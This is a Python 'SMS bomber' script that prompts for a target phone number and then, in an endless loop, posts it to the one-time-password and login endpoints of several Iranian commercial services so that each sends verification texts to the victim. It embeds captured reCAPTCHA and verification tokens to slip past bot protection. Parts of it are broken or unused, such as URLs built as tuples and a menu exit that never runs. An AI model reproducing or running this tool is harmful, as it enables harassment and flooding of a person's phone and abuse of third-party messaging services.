#made by parsa zarabi
#enjoy

#------import------
import requests
import urllib3
from time import sleep
import time
from colorama import Fore
import pyfiglet
import os
import sys
#----banner----
os.system("cls")
print("""███████╗████████╗ ██████╗ ██████╗ ███╗   ███╗     ██████╗ ███████╗    ███████╗███╗   ███╗███████╗
██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗████╗ ████║    ██╔═══██╗██╔════╝    ██╔════╝████╗ ████║██╔════╝
███████╗   ██║   ██║   ██║██████╔╝██╔████╔██║    ██║   ██║█████╗      ███████╗██╔████╔██║███████╗
╚════██║   ██║   ██║   ██║██╔══██╗██║╚██╔╝██║    ██║   ██║██╔══╝      ╚════██║██║╚██╔╝██║╚════██║
███████║   ██║   ╚██████╔╝██║  ██║██║ ╚═╝ ██║    ╚██████╔╝██║         ███████║██║ ╚═╝ ██║███████║
╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝     ╚═════╝ ╚═╝         ╚══════╝╚═╝     ╚═╝╚══════╝
                                                                                                 """)
print("""------------------------------------
||   Developer  : black alfa Team      ||
||   Coded by: Parsa Zarabi            ||
||   Thanks: my dad & my mum           ||
-----------------------------------------""")
print("[1] About Me")
print("[2] Exit")
#----input----
get = int(input(" ┌─["+"storm sms"+"--"+"home"+"""]
 └──╼ """+"Target phone number>> "))

numph = get
sendnums = 0



if get == 1:
    time.sleep(3)
    print("My name is parsa.z-blkAlfa and now I am 11 years old. I developed this tool in 1400, July 7, enjoy")

if get == 2:
    sys.exit
#------main------
url = ("https://web.emtiyaz.app/json/login")
data = {"send":"10000","cellphone":get}
url2 =("https://www.echarge.ir/m/login?length=19")
data2 = {"phoneNumber": get}
url3 = ("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp")
data3= {"cellphone": get}
url4 = ("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=",get)
url5 = ("https://www.okcs.com/users/mobilelogin?mobile=",get)
url6 = ("https://okala.com/account/login")
data4 = {"Mobile":get,"g-recaptcha-response":"03AGdBq25mU4cX8JfUBzJiSc28LMquB3QhS7lkbxCU7PEhmSPRa-rAffJtUJCNywzEyvN78v41ZwTrFvVuHdDwomh1fscV2UqjGkdQDdSrIDEH5-m7e9IQNNMWiQgSe70PUd6VefOmVte0b0yoX66-9fMUxotlMe6NOMDNB_ScrQl5Im5b7Gyyo5uMmBAc5lt8vWyhYjODOtGxrrLV5JipR8lXd8rN9DN2g7gPdx9NSIUgAknzXRvnbe-R9a9QM7VrM2IinGHTBml-6P047pP9WH2a1Uc4kDzT73IcBN0sjapuEW46rv19Vkh5WN2pP7Vi6OcjoZHkRec6aQvhoGPubyZdrCNDP9p4iug-HRknUnaMACKZrAfXYvyEBAAuRVZAEODZWPJ0vJtVIG3c5PB8qf9UKX82pblz3inb779MTD5js1R1yMn27JyFhNppNfHtq3HyVneTjA5b&__RequestVerificationToken=CfDJ8MwrSEjKv0FMhdAzE-Gsx_D3gYMkSFREjSSpYp4TiOVA71GT_jgsIRsnXLYPkh4jThADQTL5sgnMbYHUpaMdORxe0OnbudvZ4yql2764IoFh95bukFULfHbE4JaDDykvBdo0tVqPKnWq8a2HOICYBJc"}
while True:
    b = requests.post(url,data)
    c = requests.post(url2 , data2)
    d = requests.post(url3 , data3)
    e = requests.post(url)
    f = requests.post(url6,data4)
    sendnums += 1
    print(sendnums," messages were sent , status cod:",b.status_code , " , status cod 2:" ,c.status_code , "status cod 3 :",d.status_code,"status cod 4 :",e.status_code,"status cod 5 :",f.status_code)
